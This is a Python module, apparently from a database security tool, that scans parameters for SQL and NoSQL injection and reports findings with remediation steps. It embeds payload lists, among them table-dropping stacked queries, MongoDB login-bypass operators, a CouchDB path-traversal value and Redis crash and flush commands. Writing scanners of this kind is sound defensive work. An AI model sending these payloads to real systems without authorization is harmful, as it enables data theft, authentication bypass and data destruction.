"""
SQL Injection Scanner Service

Scans databases for SQL injection and NoSQL injection vulnerabilities.
"""

import re
import time
from typing import Any, Dict, List, Optional, Tuple

from ...proto import (
    DatabaseType,
    SeverityLevel,
    ConfidenceLevel,
    FindingCategory,
    FindingSubCategory,
)
from .finding_service import FindingService


# =============================================================================
# SQL Injection Payloads
# =============================================================================

SQL_INJECTION_PAYLOADS = {
    "error_based": [
        # Single quote tests
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        
        # Double quote tests
        '"',
        '" OR "1"="1',
        '" OR "1"="1"--',
        
        # Numeric tests
        "1 OR 1=1",
        "1' OR '1'='1",
        "1) OR (1=1",
        
        # Comment injection
        "/*",
        "*/",
        "-- ",
        "#",
        
        # Error triggering
        "'/*",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "1 UNION SELECT 1,2,3--",
        "') UNION SELECT NULL--",
    ],
    "boolean_based": [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR '1'='1",
        "' OR '1'='2",
        "1' AND 1=1#",
        "1' AND 1=2#",
    ],
    "time_based": [
        # MySQL
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND BENCHMARK(5000000,MD5(1))--",
        
        # PostgreSQL
        "'; SELECT pg_sleep(5)--",
        "' || pg_sleep(5)--",
        
        # MSSQL
        "'; WAITFOR DELAY '0:0:5'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        
        # Oracle
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    ],
    "stacked_queries": [
        "'; DROP TABLE test--",
        "'; SELECT 1--",
        "1; SELECT version()--",
        "'; INSERT INTO test VALUES(1)--",
    ],
}


# =============================================================================
# NoSQL Injection Payloads
# =============================================================================

NOSQL_INJECTION_PAYLOADS = {
    "mongodb": [
        # Operator injection
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$exists": true}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        '{"$or": [{"a": 1}, {"b": 2}]}',
        
        # JavaScript injection
        '"; return true; var a = "',
        "'; return true; var a = '",
        '{"$where": "function() { return true; }"}',
        '{"$where": "sleep(5000)"}',
        
        # Authentication bypass
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"username": "admin", "password": {"$ne": ""}}',
    ],
    "couchdb": [
        # View injection
        '{"keys": ["../../../etc/passwd"]}',
        '{"startkey": "a", "endkey": "z\\u0000"}',
        
        # JavaScript injection in views
        'emit(doc._id, doc); /* }}*/function(){ return true }/*',
    ],
    "redis": [
        # Command injection
        "EVAL return redis.call('keys','*') 0",
        "CONFIG GET *",
        "DEBUG SEGFAULT",
        "SCRIPT FLUSH",
    ],
}


# =============================================================================
# Error Signatures
# =============================================================================

SQL_ERROR_SIGNATURES = {
    DatabaseType.MYSQL: [
        r"You have an error in your SQL syntax",
        r"Warning: mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL server version",
        r"Unknown column",
        r"mysql_fetch_array\(",
        r"mysql_num_rows\(",
    ],
    DatabaseType.POSTGRESQL: [
        r"PostgreSQL.*ERROR",
        r"Warning: pg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
    ],
    DatabaseType.MSSQL: [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"(\W|\A)SQL Server.*Driver",
        r"Warning.*mssql_",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.SqlException",
        r"Exception.*\WSystem\.Data\.SqlClient\.",
        r"Unclosed quotation mark after the character string",
    ],
    DatabaseType.ORACLE: [
        r"ORA-[0-9]{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning: oci_",
        r"quoted string not properly terminated",
        r"java\.sql\.SQLException.*Oracle",
    ],
    DatabaseType.SQLITE: [
        r"SQLite/JDBCDriver",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning: sqlite_",
        r"Warning: SQLite3::",
        r"SQLITE_ERROR",
        r"\[SQLITE_ERROR\]",
    ],
}


class SQLInjectionScanner:
    """Scans for SQL injection vulnerabilities."""
    
    def __init__(self, plugin_instance: Any = None):
        self.plugin = plugin_instance
        self.finding_service = FindingService()
        self.findings: List[Any] = []
    
    def scan_parameter(
        self,
        endpoint: str,
        parameter: str,
        db_type: DatabaseType,
        test_function: callable,
    ) -> List[Dict[str, Any]]:
        """
        Scan a parameter for SQL injection.
        
        Args:
            endpoint: Target endpoint/query
            parameter: Parameter to test
            db_type: Database type
            test_function: Function to execute test (takes payload, returns response)
            
        Returns:
            List of vulnerability findings
        """
        findings = []
        
        # Test error-based injection
        error_findings = self._test_error_based(
            endpoint, parameter, db_type, test_function
        )
        findings.extend(error_findings)
        
        # Test union-based injection
        union_findings = self._test_union_based(
            endpoint, parameter, db_type, test_function
        )
        findings.extend(union_findings)
        
        # Test boolean-based injection
        boolean_findings = self._test_boolean_based(
            endpoint, parameter, db_type, test_function
        )
        findings.extend(boolean_findings)
        
        # Test time-based injection
        time_findings = self._test_time_based(
            endpoint, parameter, db_type, test_function
        )
        findings.extend(time_findings)
        
        return findings
    
    def _test_error_based(
        self,
        endpoint: str,
        parameter: str,
        db_type: DatabaseType,
        test_function: callable,
    ) -> List[Dict[str, Any]]:
        """Test for error-based SQL injection."""
        findings = []
        error_patterns = SQL_ERROR_SIGNATURES.get(db_type, [])
        
        for payload in SQL_INJECTION_PAYLOADS["error_based"][:10]:  # Top 10
            try:
                response = test_function(payload)
                
                # Check for SQL errors in response
                for pattern in error_patterns:
                    if re.search(pattern, str(response), re.I):
                        finding = self.finding_service.create_finding(
                            category=FindingCategory.INJECTION,
                            sub_category=FindingSubCategory.SQL_INJECTION,
                            severity=SeverityLevel.CRITICAL,
                            title="Error-based SQL Injection",
                            description=f"SQL injection vulnerability found in parameter '{parameter}'",
                            database_type=db_type,
                            evidence=f"Payload: {payload}\nError pattern matched: {pattern}",
                            recommendation="Use parameterized queries/prepared statements",
                            remediation_steps=[
                                "Use parameterized queries instead of string concatenation",
                                "Implement input validation",
                                "Use ORM with proper escaping",
                                "Enable database query logging for monitoring",
                            ],
                        )
                        findings.append(finding)
                        self.findings.append(finding)
                        break
            except Exception:
                pass
        
        return findings
    
    def _test_union_based(
        self,
        endpoint: str,
        parameter: str,
        db_type: DatabaseType,
        test_function: callable,
    ) -> List[Dict[str, Any]]:
        """Test for UNION-based SQL injection."""
        findings = []
        
        for payload in SQL_INJECTION_PAYLOADS["union_based"]:
            try:
                response = test_function(payload)
                
                # Check for data leakage indicators
                if self._detect_union_success(response, db_type):
                    finding = self.finding_service.create_finding(
                        category=FindingCategory.INJECTION,
                        sub_category=FindingSubCategory.SQL_INJECTION,
                        severity=SeverityLevel.CRITICAL,
                        title="UNION-based SQL Injection",
                        description=f"UNION-based SQL injection in parameter '{parameter}'",
                        database_type=db_type,
                        evidence=f"Payload: {payload}",
                        recommendation="Use parameterized queries",
                    )
                    findings.append(finding)
                    self.findings.append(finding)
                    break
            except Exception:
                pass
        
        return findings
    
    def _test_boolean_based(
        self,
        endpoint: str,
        parameter: str,
        db_type: DatabaseType,
        test_function: callable,
    ) -> List[Dict[str, Any]]:
        """Test for boolean-based blind SQL injection."""
        findings = []
        
        # Test true/false condition pairs
        true_payloads = ["' AND '1'='1", "' OR '1'='1", "1' AND 1=1#"]
        false_payloads = ["' AND '1'='2", "' OR '1'='2", "1' AND 1=2#"]
        
        for true_p, false_p in zip(true_payloads, false_payloads):
            try:
                true_response = test_function(true_p)
                false_response = test_function(false_p)
                
                # Different responses indicate boolean injection
                if self._responses_differ_significantly(true_response, false_response):
                    finding = self.finding_service.create_finding(
                        category=FindingCategory.INJECTION,
                        sub_category=FindingSubCategory.SQL_INJECTION,
                        severity=SeverityLevel.HIGH,
                        confidence=ConfidenceLevel.MEDIUM,
                        title="Boolean-based Blind SQL Injection",
                        description=f"Boolean-based blind SQL injection in '{parameter}'",
                        database_type=db_type,
                        evidence=f"True payload: {true_p}\nFalse payload: {false_p}",
                        recommendation="Use parameterized queries",
                    )
                    findings.append(finding)
                    self.findings.append(finding)
                    break
            except Exception:
                pass
        
        return findings
    
    def _test_time_based(
        self,
        endpoint: str,
        parameter: str,
        db_type: DatabaseType,
        test_function: callable,
        delay_threshold: float = 4.0,
    ) -> List[Dict[str, Any]]:
        """Test for time-based blind SQL injection."""
        findings = []
        
        for payload in SQL_INJECTION_PAYLOADS["time_based"]:
            try:
                start_time = time.time()
                test_function(payload)
                elapsed = time.time() - start_time
                
                if elapsed >= delay_threshold:
                    finding = self.finding_service.create_finding(
                        category=FindingCategory.INJECTION,
                        sub_category=FindingSubCategory.SQL_INJECTION,
                        severity=SeverityLevel.HIGH,
                        confidence=ConfidenceLevel.MEDIUM,
                        title="Time-based Blind SQL Injection",
                        description=f"Time-based blind SQL injection in '{parameter}'",
                        database_type=db_type,
                        evidence=f"Payload: {payload}\nDelay: {elapsed:.2f}s",
                        recommendation="Use parameterized queries",
                    )
                    findings.append(finding)
                    self.findings.append(finding)
                    break
            except Exception:
                pass
        
        return findings
    
    def scan_nosql(
        self,
        endpoint: str,
        parameter: str,
        db_type: DatabaseType,
        test_function: callable,
    ) -> List[Dict[str, Any]]:
        """Scan for NoSQL injection vulnerabilities."""
        findings = []
        
        if db_type == DatabaseType.MONGODB:
            payloads = NOSQL_INJECTION_PAYLOADS["mongodb"]
        elif db_type == DatabaseType.COUCHDB:
            payloads = NOSQL_INJECTION_PAYLOADS["couchdb"]
        elif db_type == DatabaseType.REDIS:
            payloads = NOSQL_INJECTION_PAYLOADS["redis"]
        else:
            payloads = []
        
        for payload in payloads:
            try:
                response = test_function(payload)
                
                if self._detect_nosql_success(response, db_type, payload):
                    finding = self.finding_service.create_finding(
                        category=FindingCategory.INJECTION,
                        sub_category=FindingSubCategory.NOSQL_INJECTION,
                        severity=SeverityLevel.CRITICAL,
                        title="NoSQL Injection",
                        description=f"NoSQL injection in parameter '{parameter}'",
                        database_type=db_type,
                        evidence=f"Payload: {payload}",
                        recommendation="Sanitize user input and use safe query methods",
                        remediation_steps=[
                            "Use parameterized queries or safe query builders",
                            "Validate input types strictly",
                            "Disable JavaScript execution if not needed (MongoDB)",
                            "Use allowlists for operators",
                        ],
                    )
                    findings.append(finding)
                    self.findings.append(finding)
                    break
            except Exception:
                pass
        
        return findings
    
    def _detect_union_success(self, response: str, db_type: DatabaseType) -> bool:
        """Detect if UNION injection succeeded."""
        # Look for NULL values or numeric patterns in response
        indicators = [
            r"NULL",
            r"\b1\b.*\b2\b.*\b3\b",
            r"column.*does not exist",
        ]
        
        for indicator in indicators:
            if re.search(indicator, str(response), re.I):
                return True
        return False
    
    def _responses_differ_significantly(
        self,
        response1: str,
        response2: str,
        threshold: float = 0.3,
    ) -> bool:
        """Check if two responses differ significantly."""
        r1, r2 = str(response1), str(response2)
        
        # Length difference
        if abs(len(r1) - len(r2)) > min(len(r1), len(r2)) * threshold:
            return True
        
        # Content difference (simple check)
        if r1 != r2:
            # Check for specific difference indicators
            indicators = ["error", "not found", "invalid", "success", "true", "false"]
            for ind in indicators:
                in_r1 = ind.lower() in r1.lower()
                in_r2 = ind.lower() in r2.lower()
                if in_r1 != in_r2:
                    return True
        
        return False
    
    def _detect_nosql_success(
        self,
        response: str,
        db_type: DatabaseType,
        payload: str,
    ) -> bool:
        """Detect if NoSQL injection succeeded."""
        response_str = str(response)
        
        # MongoDB indicators
        if db_type == DatabaseType.MONGODB:
            success_indicators = [
                r"matched",
                r"modified",
                r"returned",
                r'"ok"\s*:\s*1',
                r'"nModified"\s*:\s*[1-9]',
            ]
            for ind in success_indicators:
                if re.search(ind, response_str, re.I):
                    return True
        
        # Redis command execution
        if db_type == DatabaseType.REDIS:
            if "OK" in response_str or "keys" in response_str.lower():
                return True
        
        return False
    
    def get_findings(self) -> List[Any]:
        """Get all findings."""
        return self.findings
    
    def clear(self):
        """Clear findings."""
        self.findings.clear()
        self.finding_service.clear()

